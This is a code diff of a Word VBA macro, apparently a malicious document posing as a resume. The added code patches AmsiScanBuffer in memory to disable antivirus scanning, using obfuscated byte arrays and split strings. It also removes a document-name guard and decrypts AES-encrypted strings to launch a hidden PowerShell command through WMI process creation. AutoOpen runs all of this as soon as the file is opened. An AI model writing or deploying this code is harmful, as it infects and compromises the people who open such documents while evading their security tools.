@@ -579,9 +579,49 @@ Option Explicit
 
 Function TQQQ()
   
-  If Application.ActiveDocument.Name <> "resume.doc" Then
-   Exit Function
-  End If
+  Dim DLLAm As LongPtr
+  Dim BuffAddrAm As LongPtr
+  Dim resu As Long
+  Dim AArray As LongPtr
+
+
+  #If Win64 Then
+    Dim BArray(6) As Byte
+    BArray(0) = 180 + 4
+    BArray(1) = 84 + 3
+    BArray(2) = 0
+    BArray(3) = 5 + 2
+    BArray(4) = 120 + 8
+    BArray(5) = 190 + 5
+  #Else
+    Dim BArray(8) As Byte
+    BArray(0) = 182 + 2
+    BArray(1) = 86 + 1
+    BArray(2) = 0
+    BArray(3) = 4 + 3
+    BArray(4) = 128
+    BArray(5) = 194
+    BArray(6) = 22 + 2
+    BArray(7) = 0
+  #End If
+    
+
+    DLLAm = LoadLibrary("am" + "si" + ".dll")
+    BuffAddrAm = GetProcAddress(DLLAm, "Amsi" + "S" + "canBuffer")
+    
+  #If Win64 Then
+    resu = VirtualProtect(ByVal BuffAddrAm, 6, 64, 0)
+    AArray = VarPtr(BArray(0))
+    CopyMem ByVal BuffAddrAm, ByVal AArray, 6
+  #Else
+    resu = VirtualProtect(ByVal BuffAddrAm, 8, 64, 0)
+    AArray = VarPtr(BArray(0))
+    CopyMem ByVal BuffAddrAm, ByVal AArray, 8
+  #End If
+  
+  'If Application.ActiveDocument.Name <> "Resume_1234" Then
+   'Exit Function
+  'End If
   
   Dim tmp As Long
   
@@ -592,15 +632,19 @@ Function TQQQ()
   Dim VOO As String
   Dim VTX As String
   Dim BTC As String
+  Dim ETH As String
+  Dim DOGE As String
   
   VOO = AesDecryptString("U2FsdGVkX19PiDhkmWW7z5wtQLQppyq00Q==", "coldpizza")
   
   VTX = AesDecryptString("U2FsdGVkX1+Jn+o7ZugVLDU8118ykw+s55SHByc=", "coldpizza")
   
-  BTC = AesDecryptString("U2FsdGVkX1/LDJWKtW1ZpuaJRF/eKc7AAVNETB4GHGOwVPF6GLrTVYgZTqpMwBhA7CONP0AO0bhqw29gk5TBO7GumzWFFyo4UypidzfZcsoNJX2nAjntXgYPkeQCabSz6XorXIkTKEukRTMMCHxFJW3+r721wiZ4yCh4dxiSaXuHTXXXJzFb87xH0sUlsAk=", "coldpizza")
   
+  BTC = "U2FsdGVkX19RXGnLnaqN2IneJ9NJ1jLxjRASXJ45LLhv5WIJVi+DvB8/ahunc7A7JhTGcsN4QjH2HsYLMmtv6lleM/UxAYlto068ZOum9pWBj+eMC1SjToM40XbQxK/ZOv+4jCAWD+a2FTskaxdreyCCJMjzFYGXlnsPYdW765IIgUbSC20lhou7D58imSW72o/E+ZOObahpvj5SLuGmh9OGCLezGjec"
   
-  GetObject(VOO).Get(VTX).Create BTC, Null, Null, Null
+'powershell oneliner nothing special
+  
+  GetObject(VOO).Get(VTX).Create AesDecryptString(BTC, "coldpizza"), Null, Null, Null
   
 End Function
 
@@ -611,5 +655,3 @@ End Sub
 Sub AutoOpen()
   TQQQ
 End Sub
-
-
